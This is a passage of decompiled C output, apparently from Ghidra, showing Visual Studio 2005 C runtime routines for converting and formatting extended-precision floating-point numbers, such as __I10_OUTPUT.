      iVar14 = (int)(local_14 + ((int)local_14 >> 0x1f & 0x1fU)) >> 5;
      uVar13 = local_14 & 0x8000001f;
      if ((int)uVar13 < 0) {
        uVar13 = (uVar13 - 1 | 0xffffffe0) + 1;
      }
      local_10 = 0;
      _Ifp = (_LDBL12 *)0x0;
      local_8 = (_LDBL12 *)(0x20 - uVar13);
      do {
        p_Var2 = local_24[(int)_Ifp];
        local_14 = (uint)p_Var2 & ~(-1 << ((byte)uVar13 & 0x1f));
        local_24[(int)_Ifp] = (_LDBL12 *)((uint)p_Var2 >> ((byte)uVar13 & 0x1f) | local_10);
        _Ifp = (_LDBL12 *)(_Ifp->ld12 + 1);
        local_10 = local_14 << ((byte)(0x20 - uVar13) & 0x1f);
      } while ((int)_Ifp < 3);
      iVar4 = 2;
      pp_Var9 = local_24 + (2 - iVar14);
      do {
        if (iVar4 < iVar14) {
          local_24[iVar4] = (_LDBL12 *)0x0;
        }
        else {
          local_24[iVar4] = *pp_Var9;
        }
        iVar4 = iVar4 + -1;
        pp_Var9 = pp_Var9 + -1;
      } while (-1 < iVar4);
      iVar4 = DAT_00423710 - 1;
      iVar14 = (int)(DAT_00423710 + ((int)DAT_00423710 >> 0x1f & 0x1fU)) >> 5;
      uVar13 = DAT_00423710 & 0x8000001f;
      local_10 = iVar14;
      if ((int)uVar13 < 0) {
        uVar13 = (uVar13 - 1 | 0xffffffe0) + 1;
      }
      bVar7 = (byte)(0x1f - uVar13);
      pp_Var9 = local_24 + iVar14;
      local_14 = 0x1f - uVar13;
      if (((uint)*pp_Var9 & 1 << (bVar7 & 0x1f)) != 0) {
        p_Var2 = (_LDBL12 *)((uint)local_24[iVar14] & ~(-1 << (bVar7 & 0x1f)));
        while (p_Var2 == (_LDBL12 *)0x0) {
          iVar14 = iVar14 + 1;
          if (2 < iVar14) goto LAB_0041a20c;
          p_Var2 = local_24[iVar14];
        }
        iVar14 = (int)(iVar4 + (iVar4 >> 0x1f & 0x1fU)) >> 5;
        bVar16 = false;
        p_Var12 = (_LDBL12 *)(1 << (0x1f - ((byte)iVar4 & 0x1f) & 0x1f));
        p_Var2 = local_24[iVar14];
        puVar1 = p_Var12->ld12 + (int)p_Var2->ld12;
        if ((puVar1 < p_Var2) || (puVar1 < p_Var12)) {
          bVar16 = true;
        }
        local_24[iVar14] = (_LDBL12 *)puVar1;
        while ((iVar14 = iVar14 + -1, -1 < iVar14 && (bVar16))) {
          p_Var2 = local_24[iVar14];
          puVar1 = p_Var2->ld12 + 1;
          bVar16 = false;
          if ((puVar1 < p_Var2) || (puVar1 == (uchar *)0x0)) {
            bVar16 = true;
          }
          local_24[iVar14] = (_LDBL12 *)puVar1;
        }
      }
LAB_0041a20c:
      *pp_Var9 = (_LDBL12 *)((uint)*pp_Var9 & -1 << ((byte)local_14 & 0x1f));
      iVar14 = local_10 + 1;
      if (iVar14 < 3) {
        pp_Var9 = local_24 + iVar14;
        for (iVar4 = 3 - iVar14; iVar4 != 0; iVar4 = iVar4 + -1) {
          *pp_Var9 = (_LDBL12 *)0x0;
          pp_Var9 = pp_Var9 + 1;
        }
      }
      uVar13 = DAT_00423714 + 1;
      iVar14 = (int)(uVar13 + ((int)uVar13 >> 0x1f & 0x1fU)) >> 5;
      uVar13 = uVar13 & 0x8000001f;
      if ((int)uVar13 < 0) {
        uVar13 = (uVar13 - 1 | 0xffffffe0) + 1;
      }
      local_10 = 0;
      _Ifp = (_LDBL12 *)0x0;
      local_8 = (_LDBL12 *)(0x20 - uVar13);
      do {
        p_Var2 = local_24[(int)_Ifp];
        local_14 = (uint)p_Var2 & ~(-1 << ((byte)uVar13 & 0x1f));
        local_24[(int)_Ifp] = (_LDBL12 *)((uint)p_Var2 >> ((byte)uVar13 & 0x1f) | local_10);
        _Ifp = (_LDBL12 *)(_Ifp->ld12 + 1);
        local_10 = local_14 << ((byte)(0x20 - uVar13) & 0x1f);
      } while ((int)_Ifp < 3);
      iVar4 = 2;
      pp_Var9 = local_24 + (2 - iVar14);
      do {
        if (iVar4 < iVar14) {
          local_24[iVar4] = (_LDBL12 *)0x0;
        }
        else {
          local_24[iVar4] = *pp_Var9;
        }
        iVar4 = iVar4 + -1;
        pp_Var9 = pp_Var9 + -1;
      } while (-1 < iVar4);
    }
    iVar14 = 0;
    IVar5 = INTRNCVT_UNDERFLOW;
  }
LAB_0041a420:
  uVar13 = iVar14 << (0x1fU - (char)DAT_00423714 & 0x1f) | -(uint)(local_18 != 0) & 0x80000000 |
           (uint)local_24[0];
  if (DAT_00423718 == 0x40) {
    *(uint *)((int)&_D->x + 4) = uVar13;
    *(_LDBL12 **)&_D->x = local_24[1];
  }
  else if (DAT_00423718 == 0x20) {
    *(uint *)&_D->x = uVar13;
  }
  return IVar5;
}



// WARNING: Removing unreachable block (ram,0x0041a723)
// WARNING: Removing unreachable block (ram,0x0041a6ec)
// WARNING: Removing unreachable block (ram,0x0041aaa0)
// WARNING: Removing unreachable block (ram,0x0041a6fb)
// WARNING: Removing unreachable block (ram,0x0041a703)
// WARNING: Removing unreachable block (ram,0x0041a709)
// WARNING: Removing unreachable block (ram,0x0041a70c)
// WARNING: Removing unreachable block (ram,0x0041a713)
// WARNING: Removing unreachable block (ram,0x0041a71d)
// WARNING: Removing unreachable block (ram,0x0041a778)
// WARNING: Removing unreachable block (ram,0x0041a772)
// WARNING: Removing unreachable block (ram,0x0041a77e)
// WARNING: Removing unreachable block (ram,0x0041a79b)
// WARNING: Removing unreachable block (ram,0x0041a79d)
// WARNING: Removing unreachable block (ram,0x0041a7a5)
// WARNING: Removing unreachable block (ram,0x0041a7a8)
// WARNING: Removing unreachable block (ram,0x0041a7ad)
// WARNING: Removing unreachable block (ram,0x0041a7b0)
// WARNING: Removing unreachable block (ram,0x0041aaa9)
// WARNING: Removing unreachable block (ram,0x0041a7bb)
// WARNING: Removing unreachable block (ram,0x0041aac0)
// WARNING: Removing unreachable block (ram,0x0041aac7)
// WARNING: Removing unreachable block (ram,0x0041a7c6)
// WARNING: Removing unreachable block (ram,0x0041a7d9)
// WARNING: Removing unreachable block (ram,0x0041a7db)
// WARNING: Removing unreachable block (ram,0x0041a7e8)
// WARNING: Removing unreachable block (ram,0x0041a7ed)
// WARNING: Removing unreachable block (ram,0x0041a7f1)
// WARNING: Removing unreachable block (ram,0x0041a7fa)
// WARNING: Removing unreachable block (ram,0x0041a812)
// WARNING: Removing unreachable block (ram,0x0041a823)
// WARNING: Removing unreachable block (ram,0x0041a837)
// WARNING: Removing unreachable block (ram,0x0041a86f)
// WARNING: Removing unreachable block (ram,0x0041a87a)
// WARNING: Removing unreachable block (ram,0x0041a885)
// WARNING: Removing unreachable block (ram,0x0041a88c)
// WARNING: Removing unreachable block (ram,0x0041a899)
// WARNING: Removing unreachable block (ram,0x0041a89e)
// WARNING: Removing unreachable block (ram,0x0041a8a8)
// WARNING: Removing unreachable block (ram,0x0041a8ae)
// WARNING: Removing unreachable block (ram,0x0041a8bd)
// WARNING: Removing unreachable block (ram,0x0041a8c4)
// WARNING: Removing unreachable block (ram,0x0041a8ce)
// WARNING: Removing unreachable block (ram,0x0041a8d3)
// WARNING: Removing unreachable block (ram,0x0041a8e5)
// WARNING: Removing unreachable block (ram,0x0041a8f2)
// WARNING: Removing unreachable block (ram,0x0041a901)
// WARNING: Removing unreachable block (ram,0x0041a90e)
// WARNING: Removing unreachable block (ram,0x0041a92b)
// WARNING: Removing unreachable block (ram,0x0041a92f)
// WARNING: Removing unreachable block (ram,0x0041a936)
// WARNING: Removing unreachable block (ram,0x0041a93f)
// WARNING: Removing unreachable block (ram,0x0041a942)
// WARNING: Removing unreachable block (ram,0x0041a953)
// WARNING: Removing unreachable block (ram,0x0041a956)
// WARNING: Removing unreachable block (ram,0x0041a964)
// WARNING: Removing unreachable block (ram,0x0041a96f)
// WARNING: Removing unreachable block (ram,0x0041a978)
// WARNING: Removing unreachable block (ram,0x0041a9a5)
// WARNING: Removing unreachable block (ram,0x0041a9aa)
// WARNING: Removing unreachable block (ram,0x0041a9b5)
// WARNING: Removing unreachable block (ram,0x0041a9be)
// WARNING: Removing unreachable block (ram,0x0041a9c4)
// WARNING: Removing unreachable block (ram,0x0041a9c7)
// WARNING: Removing unreachable block (ram,0x0041a9ed)
// WARNING: Removing unreachable block (ram,0x0041a9f3)
// WARNING: Removing unreachable block (ram,0x0041a9f8)
// WARNING: Removing unreachable block (ram,0x0041aa00)
// WARNING: Removing unreachable block (ram,0x0041aa11)
// WARNING: Removing unreachable block (ram,0x0041aa41)
// WARNING: Removing unreachable block (ram,0x0041aa17)
// WARNING: Removing unreachable block (ram,0x0041aa3c)
// WARNING: Removing unreachable block (ram,0x0041aa21)
// WARNING: Removing unreachable block (ram,0x0041aa36)
// WARNING: Removing unreachable block (ram,0x0041aa2d)
// WARNING: Removing unreachable block (ram,0x0041aa44)
// WARNING: Removing unreachable block (ram,0x0041aa6a)
// WARNING: Removing unreachable block (ram,0x0041aa81)
// WARNING: Removing unreachable block (ram,0x0041aa4e)
// WARNING: Removing unreachable block (ram,0x0041a8d7)
// WARNING: Removing unreachable block (ram,0x0041a8b4)
// WARNING: Removing unreachable block (ram,0x0041aa84)
// WARNING: Removing unreachable block (ram,0x0041aa8e)
// WARNING: Removing unreachable block (ram,0x0041aacf)

void __cdecl
FUN_0041a463(undefined2 *param_1,char **param_2,char *param_3,int param_4,int param_5,int param_6,
            undefined4 param_7,int param_8)

{
  char cVar1;
  uint uVar2;
  int *piVar3;
  
  uVar2 = DAT_00422044 ^ (uint)&stack0xfffffffc;
  if (param_8 == 0) {
    piVar3 = __errno();
    *piVar3 = 0x16;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
    ___security_check_cookie_4(uVar2 ^ (uint)&stack0xfffffffc);
    return;
  }
  for (; (((cVar1 = *param_3, cVar1 == ' ' || (cVar1 == '\t')) || (cVar1 == '\n')) ||
         (cVar1 == '\r')); param_3 = param_3 + 1) {
  }
                    // WARNING: Could not recover jumptable at 0x0041a4f4. Too many branches
                    // WARNING: Treating indirect jump as call
  (*DAT_0041aaf7)();
  return;
}



// WARNING: Removing unreachable block (ram,0x0041b018)
// WARNING: Removing unreachable block (ram,0x0041b022)
// WARNING: Removing unreachable block (ram,0x0041b027)
// Library Function - Single Match
//  _$I10_OUTPUT
// 
// Library: Visual Studio 2005 Release

void __cdecl
__I10_OUTPUT(int param_1,uint param_2,ushort param_3,int param_4,byte param_5,short *param_6)

{
  short *psVar1;
  int iVar2;
  int *piVar3;
  int iVar4;
  bool bVar5;
  int iVar6;
  errno_t eVar7;
  undefined4 *puVar8;
  ushort uVar9;
  ushort uVar10;
  int *piVar11;
  int iVar12;
  uint uVar13;
  ushort uVar14;
  uint uVar15;
  char cVar16;
  uint uVar17;
  int iVar18;
  short *psVar19;
  short *psVar20;
  int iVar21;
  uint uVar22;
  uint uVar23;
  ushort uVar24;
  ushort uVar25;
  char *pcVar26;
  undefined *local_6c;
  ushort *local_60;
  ushort *local_5c;
  int *local_58;
  int local_54;
  short local_50;
  ushort *local_4c;
  uint local_48;
  int local_44;
  undefined2 local_40;
  undefined4 uStack_3e;
  ushort uStack_3a;
  int local_38;
  undefined4 local_34;
  undefined4 local_30;
  undefined local_2c;
  undefined uStack_2b;
  undefined uStack_2a;
  undefined uStack_29;
  undefined4 local_24;
  ushort uStack_20;
  ushort uStack_1e;
  ushort uStack_1c;
  undefined local_1a;
  byte bStack_19;
  byte local_14;
  undefined uStack_13;
  ushort uStack_12;
  undefined4 local_10;
  ushort local_c;
  ushort uStack_a;
  uint local_8;
  
  uVar17 = CONCAT22(local_24._2_2_,(undefined2)local_24);
  iVar2 = CONCAT22(uStack_3e._2_2_,(undefined2)uStack_3e);
  local_8 = DAT_00422044 ^ (uint)&stack0xfffffffc;
  local_14 = (byte)param_1;
  uStack_13 = (undefined)((uint)param_1 >> 8);
  uStack_12 = (ushort)((uint)param_1 >> 0x10);
  local_10._0_2_ = (ushort)param_2;
  iVar18 = CONCAT22((ushort)local_10,uStack_12);
  local_10._2_2_ = (ushort)(param_2 >> 0x10);
  local_c = param_3;
  uVar9 = param_3 & 0x8000;
  uVar15 = param_3 & 0x7fff;
  local_34 = 0xcccccccc;
  local_30 = 0xcccccccc;
  local_2c = 0xcc;
  uStack_2b = 0xcc;
  uStack_2a = 0xfb;
  uStack_29 = 0x3f;
  if (uVar9 == 0) {
    *(undefined *)(param_6 + 1) = 0x20;
  }
  else {
    *(undefined *)(param_6 + 1) = 0x2d;
  }
  if ((((short)uVar15 == 0) && (param_2 == 0)) && (param_1 == 0)) {
    *param_6 = 0;
    *(byte *)(param_6 + 1) = ((uVar9 != 0x8000) - 1U & 0xd) + 0x20;
    *(undefined *)((int)param_6 + 3) = 1;
    *(undefined *)(param_6 + 2) = 0x30;
    *(undefined *)((int)param_6 + 5) = 0;
    goto LAB_0041b3a7;
  }
  if ((short)uVar15 == 0x7fff) {
    *param_6 = 1;
    if (((param_2 == 0x80000000) && (param_1 == 0)) || ((param_2 & 0x40000000) != 0)) {
      if ((uVar9 == 0) || (param_2 != 0xc0000000)) {
        if ((param_2 != 0x80000000) || (param_1 != 0)) goto LAB_0041ac56;
        pcVar26 = &DAT_00420050;
      }
      else {
        if (param_1 != 0) {
LAB_0041ac56:
          pcVar26 = (char *)&DAT_00420048;
          goto LAB_0041ac5b;
        }
        pcVar26 = s_1_IND_00420058;
      }
      eVar7 = _strcpy_s((char *)(param_6 + 2),0x16,pcVar26);
      if (eVar7 != 0) {
                    // WARNING: Subroutine does not return
        __invoke_watson((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
      }
      *(undefined *)((int)param_6 + 3) = 5;
    }
    else {
      pcVar26 = s_1_SNAN_00420060;
LAB_0041ac5b:
      eVar7 = _strcpy_s((char *)(param_6 + 2),0x16,pcVar26);
      if (eVar7 != 0) {
                    // WARNING: Subroutine does not return
        __invoke_watson((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
      }
      *(undefined *)((int)param_6 + 3) = 6;
    }
    iVar2 = CONCAT22(uStack_3e._2_2_,(undefined2)uStack_3e);
    param_2 = CONCAT22(local_10._2_2_,(ushort)local_10);
    uVar17 = CONCAT22(local_24._2_2_,(undefined2)local_24);
    goto LAB_0041b3a7;
  }
  local_50 = (short)(((uVar15 >> 8) + (param_2 >> 0x18) * 2) * 0x4d + -0x134312f4 + uVar15 * 0x4d10
                    >> 0x10);
  uVar17 = (uint)local_50;
  local_1a = (undefined)uVar15;
  bStack_19 = (byte)(uVar15 >> 8);
  local_24._2_2_ = (ushort)param_1;
  local_24._0_2_ = 0;
  local_6c = &DAT_004236c0;
  uStack_20 = uStack_12;
  uStack_1e = (ushort)local_10;
  uStack_1c = local_10._2_2_;
  if (uVar17 != 0) {
    iVar21 = param_1;
    uVar15 = -uVar17;
    if (0 < (int)uVar17) {
      local_6c = &DAT_00423820;
      uVar15 = uVar17;
    }
    while (uVar15 != 0) {
      uStack_20 = (ushort)((uint)iVar21 >> 0x10);
      local_24._2_2_ = (ushort)iVar21;
      local_6c = local_6c + 0x54;
      iVar4 = CONCAT22(local_c,local_10._2_2_);
      if ((uVar15 & 7) == 0) goto LAB_0041af7c;
      piVar11 = (int *)(local_6c + (uVar15 & 7) * 0xc);
      if (0x7fff < *(ushort *)piVar11) {
        local_40 = (undefined2)*piVar11;
        uStack_3e._0_2_ = (undefined2)((uint)*piVar11 >> 0x10);
        piVar3 = piVar11 + 2;
        uStack_3e._2_2_ = (undefined2)piVar11[1];
        uStack_3a = (ushort)((uint)piVar11[1] >> 0x10);
        piVar11 = (int *)&local_40;
        local_38 = *piVar3;
        iVar2 = CONCAT22(uStack_3e._2_2_,(undefined2)uStack_3e) + -1;
        uStack_3e._0_2_ = (undefined2)iVar2;
        uStack_3e._2_2_ = (undefined2)((uint)iVar2 >> 0x10);
      }
      uVar14 = CONCAT11(bStack_19,local_1a) & 0x7fff;
      uVar24 = *(ushort *)((int)piVar11 + 10) & 0x7fff;
      local_4c = (ushort *)0x0;
      local_14 = 0;
      uStack_13 = 0;
      uStack_12 = 0;
      local_10._0_2_ = 0;
      iVar12 = 0;
      local_10._2_2_ = 0;
      local_c = 0;
      iVar6 = 0;
      uStack_a = 0;
      uVar10 = (*(ushort *)((int)piVar11 + 10) ^ CONCAT11(bStack_19,local_1a)) & 0x8000;
      uVar25 = uVar24 + uVar14;
      iVar18 = 0;
      iVar4 = 0;
      if (((uVar14 < 0x7fff) && (iVar18 = 0, iVar4 = 0, uVar24 < 0x7fff)) &&
         (iVar18 = iVar12, iVar4 = iVar6, uVar25 < 0xbffe)) {
        if (uVar25 < 0x3fc0) {
          uStack_1c = 0;
          local_1a = 0;
          bStack_19 = 0;
          uStack_20 = 0;
          uStack_1e = 0;
          local_24._0_2_ = 0;
          local_24._2_2_ = 0;
          iVar21 = 0;
        }
        else if (((uVar14 == 0) &&
                 (uVar25 = uVar25 + 1,
                 (CONCAT13(bStack_19,CONCAT12(local_1a,uStack_1c)) & 0x7fffffff) == 0)) &&
                ((CONCAT22(uStack_1e,uStack_20) == 0 &&
                 (CONCAT22(local_24._2_2_,(undefined2)local_24) == 0)))) {
          local_1a = 0;
          bStack_19 = 0;
        }
        else if ((((uVar24 == 0) && (uVar25 = uVar25 + 1, (piVar11[2] & 0x7fffffffU) == 0)) &&
                 (piVar11[1] == 0)) && (*piVar11 == 0)) {
          uStack_1c = 0;
          local_1a = 0;
          bStack_19 = 0;
          uStack_20 = 0;
          uStack_1e = 0;
          local_24._0_2_ = 0;
          local_24._2_2_ = 0;
          iVar21 = 0;
        }
        else {
          puVar8 = &local_10;
          local_60 = (ushort *)0x0;
          local_44 = 5;
          do {
            local_54 = local_44;
            if (0 < local_44) {
              local_5c = (ushort *)((int)&local_24 + (int)local_60 * 2);
              local_58 = piVar11 + 2;
              do {
                bVar5 = false;
                uVar17 = puVar8[-1] + (uint)*local_5c * (uint)*(ushort *)local_58;
                if ((uVar17 < (uint)puVar8[-1]) ||
                   (uVar17 < (uint)*local_5c * (uint)*(ushort *)local_58)) {
                  bVar5 = true;
                }
                puVar8[-1] = uVar17;
                if (bVar5) {
                  *(short *)puVar8 = *(short *)puVar8 + 1;
                }
                local_5c = local_5c + 1;
                local_58 = (int *)((int)local_58 + -2);
                local_54 = local_54 + -1;
              } while (0 < local_54);
            }
            puVar8 = (undefined4 *)((int)puVar8 + 2);
            local_60 = (ushort *)((int)local_60 + 1);
            local_44 = local_44 + -1;
          } while (0 < local_44);
          uVar25 = uVar25 + 0xc002;
          if ((short)uVar25 < 1) {
LAB_0041aea0:
            uVar25 = uVar25 - 1;
            if ((short)uVar25 < 0) {
              local_48 = (uint)(ushort)-uVar25;
              uVar25 = 0;
              do {
                if ((local_14 & 1) != 0) {
                  local_4c = (ushort *)((int)local_4c + 1);
                }
                iVar21 = CONCAT22(uStack_a,local_c);
                uVar17 = CONCAT22(local_10._2_2_,(ushort)local_10);
                iVar18 = CONCAT22(local_10._2_2_,(ushort)local_10);
                local_c = (ushort)(CONCAT22(uStack_a,local_c) >> 1);
                uStack_a = uStack_a >> 1;
                local_10._2_2_ = local_10._2_2_ >> 1 | (ushort)((uint)(iVar21 << 0x1f) >> 0x10);
                uVar13 = CONCAT22(uStack_12,CONCAT11(uStack_13,local_14)) >> 1;
                uStack_12 = uStack_12 >> 1 | (ushort)((uint)(iVar18 << 0x1f) >> 0x10);
                local_48 = local_48 - 1;
                local_10._0_2_ = (ushort)(uVar17 >> 1);
                local_14 = (byte)uVar13;
                uStack_13 = (undefined)(uVar13 >> 8);
              } while (local_48 != 0);
              if (local_4c != (ushort *)0x0) {
                local_14 = local_14 | 1;
              }
            }
          }
          else {
            do {
              uVar14 = uStack_12;
              if ((uStack_a & 0x8000) != 0) break;
              iVar18 = CONCAT22(uStack_12,CONCAT11(uStack_13,local_14)) << 1;
              local_14 = (byte)iVar18;
              uStack_13 = (undefined)((uint)iVar18 >> 8);
              uStack_12 = (ushort)((uint)iVar18 >> 0x10);
              iVar18 = CONCAT22(local_10._2_2_,(ushort)local_10) * 2;
              local_10._0_2_ = (ushort)iVar18 | uVar14 >> 0xf;
              iVar21 = CONCAT22(uStack_a,local_c) * 2;
              local_c = (ushort)iVar21 | local_10._2_2_ >> 0xf;
              uVar25 = uVar25 - 1;
              local_10._2_2_ = (ushort)((uint)iVar18 >> 0x10);
              uStack_a = (ushort)((uint)iVar21 >> 0x10);
            } while (0 < (short)uVar25);
            if ((short)uVar25 < 1) goto LAB_0041aea0;
          }
          if ((0x8000 < CONCAT11(uStack_13,local_14)) ||
             (iVar4 = CONCAT22(local_c,local_10._2_2_),
             iVar18 = CONCAT22((ushort)local_10,uStack_12),
             (CONCAT22(uStack_12,CONCAT11(uStack_13,local_14)) & 0x1ffff) == 0x18000)) {
            if (CONCAT22((ushort)local_10,uStack_12) == -1) {
              uStack_12 = 0;
              local_10._0_2_ = 0;
              iVar18 = 0;
              if (CONCAT22(local_c,local_10._2_2_) == -1) {
                local_10._2_2_ = 0;
                local_c = 0;
                if (uStack_a == 0xffff) {
                  uStack_a = 0x8000;
                  uVar25 = uVar25 + 1;
                  iVar4 = 0;
                  iVar18 = 0;
                }
                else {
                  uStack_a = uStack_a + 1;
                  iVar4 = 0;
                  iVar18 = 0;
                }
              }
              else {
                iVar4 = CONCAT22(local_c,local_10._2_2_) + 1;
                local_10._2_2_ = (ushort)iVar4;
                local_c = (ushort)((uint)iVar4 >> 0x10);
              }
            }
            else {
              iVar18 = CONCAT22((ushort)local_10,uStack_12) + 1;
              uStack_12 = (ushort)iVar18;
              local_10._0_2_ = (ushort)((uint)iVar18 >> 0x10);
              iVar4 = CONCAT22(local_c,local_10._2_2_);
            }
          }
          local_10._0_2_ = (ushort)((uint)iVar18 >> 0x10);
          uStack_12 = (ushort)iVar18;
          local_c = (ushort)((uint)iVar4 >> 0x10);
          local_10._2_2_ = (ushort)iVar4;
          if (0x7ffe < uVar25) goto LAB_0041af60;
          local_24._0_2_ = uStack_12;
          local_24._2_2_ = (ushort)local_10;
          uStack_20 = local_10._2_2_;
          iVar21 = CONCAT22(local_10._2_2_,(ushort)local_10);
          bStack_19 = (byte)(uVar25 >> 8) | (byte)(uVar10 >> 8);
          uStack_1e = local_c;
          uStack_1c = uStack_a;
          local_1a = (undefined)uVar25;
        }
      }
      else {
LAB_0041af60:
        uStack_20 = 0;
        uStack_1e = 0;
        iVar12 = (-(uint)(uVar10 != 0) & 0x80000000) + 0x7fff8000;
        local_24._0_2_ = 0;
        local_24._2_2_ = 0;
        iVar21 = 0;
        uStack_1c = (ushort)iVar12;
        local_1a = (undefined)((uint)iVar12 >> 0x10);
        bStack_19 = (byte)((uint)iVar12 >> 0x18);
      }
LAB_0041af7c:
      uStack_20 = (ushort)((uint)iVar21 >> 0x10);
      local_24._2_2_ = (ushort)iVar21;
      local_c = (ushort)((uint)iVar4 >> 0x10);
      local_10._2_2_ = (ushort)iVar4;
      local_10._0_2_ = (ushort)((uint)iVar18 >> 0x10);
      uStack_12 = (ushort)iVar18;
      param_1 = CONCAT22(uStack_12,local_24._2_2_);
      param_2 = CONCAT22(local_10._2_2_,(ushort)local_10);
      uVar15 = (int)uVar15 >> 3;
    }
  }
  local_24._2_2_ = (ushort)param_1;
  uVar17 = CONCAT13(bStack_19,CONCAT12(local_1a,uStack_1c));
  if (0x3ffe < (ushort)(uVar17 >> 0x10)) {
    local_50 = local_50 + 1;
    uVar17 = uVar17 >> 0x10 & 0x7fff;
    iVar18 = uVar17 + 0x3ffb;
    local_5c = (ushort *)0x0;
    local_14 = 0;
    uStack_13 = 0;
    uStack_12 = 0;
    param_1 = param_1 & 0xffff;
    local_10._0_2_ = 0;
    local_10._2_2_ = 0;
    param_2 = 0;
    local_c = 0;
    uStack_a = 0;
    if (((ushort)uVar17 < 0x7fff) && ((ushort)iVar18 < 0xbffe)) {
      if (0x3fbf < (ushort)iVar18) {
        if (((((ushort)uVar17 == 0) &&
             (iVar18 = uVar17 + 0x3ffc,
             (CONCAT13(bStack_19,CONCAT12(local_1a,uStack_1c)) & 0x7fffffff) == 0)) &&
            (CONCAT22(uStack_1e,uStack_20) == 0)) &&
           (CONCAT22(local_24._2_2_,(undefined2)local_24) == 0)) {
          local_1a = 0;
          bStack_19 = 0;
          goto LAB_0041b1e6;
        }
        local_58 = (int *)0x0;
        puVar8 = &local_10;
        local_44 = 5;
        do {
          local_54 = local_44;
          if (0 < local_44) {
            local_60 = (ushort *)&local_2c;
            local_4c = (ushort *)((int)&local_24 + (int)local_58 * 2);
            do {
              bVar5 = false;
              uVar17 = puVar8[-1] + (uint)*local_60 * (uint)*local_4c;
              if ((uVar17 < (uint)puVar8[-1]) || (uVar17 < (uint)*local_60 * (uint)*local_4c)) {
                bVar5 = true;
              }
              puVar8[-1] = uVar17;
              if (bVar5) {
                *(short *)puVar8 = *(short *)puVar8 + 1;
              }
              local_4c = local_4c + 1;
              local_60 = local_60 + -1;
              local_54 = local_54 + -1;
            } while (0 < local_54);
          }
          puVar8 = (undefined4 *)((int)puVar8 + 2);
          local_58 = (int *)((int)local_58 + 1);
          local_44 = local_44 + -1;
        } while (0 < local_44);
        iVar18 = iVar18 + 0xc002;
        if ((short)iVar18 < 1) {
LAB_0041b0f2:
          uVar25 = (ushort)(iVar18 + 0xffff);
          if ((short)uVar25 < 0) {
            uVar17 = -(iVar18 + 0xffff);
            uVar15 = uVar17 & 0xffff;
            uVar25 = uVar25 + (short)uVar17;
            do {
              if ((local_14 & 1) != 0) {
                local_5c = (ushort *)((int)local_5c + 1);
              }
              iVar21 = CONCAT22(uStack_a,local_c);
              uVar17 = CONCAT22(local_10._2_2_,(ushort)local_10);
              iVar18 = CONCAT22(local_10._2_2_,(ushort)local_10);
              local_c = (ushort)(CONCAT22(uStack_a,local_c) >> 1);
              uStack_a = uStack_a >> 1;
              local_10._2_2_ = local_10._2_2_ >> 1 | (ushort)((uint)(iVar21 << 0x1f) >> 0x10);
              uVar13 = CONCAT22(uStack_12,CONCAT11(uStack_13,local_14)) >> 1;
              uStack_12 = uStack_12 >> 1 | (ushort)((uint)(iVar18 << 0x1f) >> 0x10);
              uVar15 = uVar15 - 1;
              local_10._0_2_ = (ushort)(uVar17 >> 1);
              local_14 = (byte)uVar13;
              uStack_13 = (undefined)(uVar13 >> 8);
            } while (uVar15 != 0);
            if (local_5c != (ushort *)0x0) {
              local_14 = local_14 | 1;
            }
          }
        }
        else {
          do {
            uVar25 = uStack_12;
            if ((uStack_a & 0x8000) != 0) break;
            iVar21 = CONCAT22(uStack_12,CONCAT11(uStack_13,local_14)) << 1;
            local_14 = (byte)iVar21;
            uStack_13 = (undefined)((uint)iVar21 >> 8);
            uStack_12 = (ushort)((uint)iVar21 >> 0x10);
            iVar21 = CONCAT22(local_10._2_2_,(ushort)local_10) * 2;
            local_10._0_2_ = (ushort)iVar21 | uVar25 >> 0xf;
            iVar4 = CONCAT22(uStack_a,local_c) * 2;
            local_c = (ushort)iVar4 | local_10._2_2_ >> 0xf;
            iVar18 = iVar18 + 0xffff;
            local_10._2_2_ = (ushort)((uint)iVar21 >> 0x10);
            uStack_a = (ushort)((uint)iVar4 >> 0x10);
          } while (0 < (short)iVar18);
          uVar25 = (ushort)iVar18;
          if ((short)uVar25 < 1) goto LAB_0041b0f2;
        }
        if ((0x8000 < CONCAT11(uStack_13,local_14)) ||
           (iVar21 = CONCAT22(local_c,local_10._2_2_), iVar18 = CONCAT22((ushort)local_10,uStack_12)
           , (CONCAT22(uStack_12,CONCAT11(uStack_13,local_14)) & 0x1ffff) == 0x18000)) {
          if (CONCAT22((ushort)local_10,uStack_12) == -1) {
            iVar18 = 0;
            if (CONCAT22(local_c,local_10._2_2_) == -1) {
              if (uStack_a == 0xffff) {
                uStack_a = 0x8000;
                uVar25 = uVar25 + 1;
                iVar21 = 0;
                iVar18 = 0;
              }
              else {
                uStack_a = uStack_a + 1;
                iVar21 = 0;
                iVar18 = 0;
              }
            }
            else {
              iVar21 = CONCAT22(local_c,local_10._2_2_) + 1;
            }
          }
          else {
            iVar18 = CONCAT22((ushort)local_10,uStack_12) + 1;
            iVar21 = CONCAT22(local_c,local_10._2_2_);
          }
        }
        local_10._0_2_ = (ushort)((uint)iVar18 >> 0x10);
        uStack_12 = (ushort)iVar18;
        local_c = (ushort)((uint)iVar21 >> 0x10);
        local_10._2_2_ = (ushort)iVar21;
        param_2 = CONCAT22(local_10._2_2_,(ushort)local_10);
        if (uVar25 < 0x7fff) {
          local_24._0_2_ = uStack_12;
          local_24._2_2_ = (ushort)local_10;
          uStack_20 = local_10._2_2_;
          bStack_19 = (byte)(uVar25 >> 8) | bStack_19 & 0x80;
          uStack_1e = local_c;
          uStack_1c = uStack_a;
          local_1a = (undefined)uVar25;
        }
        else {
          uStack_20 = 0;
          uStack_1e = 0;
          local_24._0_2_ = 0;
          local_24._2_2_ = 0;
          iVar18 = (-(uint)((bStack_19 & 0x80) != 0) & 0x80000000) + 0x7fff8000;
          uStack_1c = (ushort)iVar18;
          local_1a = (undefined)((uint)iVar18 >> 0x10);
          bStack_19 = (byte)((uint)iVar18 >> 0x18);
        }
        param_1 = CONCAT22(uStack_12,local_24._2_2_);
        goto LAB_0041b1e6;
      }
      uStack_1c = 0;
      local_1a = 0;
      bStack_19 = 0;
    }
    else {
      iVar18 = (-(uint)((bStack_19 & 0x80) != 0) & 0x80000000) + 0x7fff8000;
      uStack_1c = (ushort)iVar18;
      local_1a = (undefined)((uint)iVar18 >> 0x10);
      bStack_19 = (byte)((uint)iVar18 >> 0x18);
    }
    uStack_20 = 0;
    uStack_1e = 0;
